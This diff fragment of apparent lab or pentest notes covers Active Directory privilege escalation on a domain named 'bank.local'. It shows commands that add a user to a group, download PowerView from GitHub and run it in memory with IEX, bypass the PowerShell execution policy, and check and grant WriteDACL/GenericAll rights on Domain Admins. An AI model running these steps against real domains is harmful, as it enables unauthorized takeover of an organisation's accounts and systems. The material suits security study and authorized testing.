@@ -64,10 +64,11 @@ $group.Add("LDAP://CN=goodboy,CN=Users,DC=bank,DC=local")
 IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
 Get-Command -Module PowerView
-
+```
 - Note: (If blocked by execution policy, run: Set-ExecutionPolicy Bypass -Scope Process -Force first)
 
 - Verify if 'bb2' has WriteDACL on Domain Admins
+
 Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object { $_.SecurityIdentifier -eq (Get-DomainUser "bb2").SID } | Select-Object ActiveDirectoryRights
 
 - Add GenericAll permission
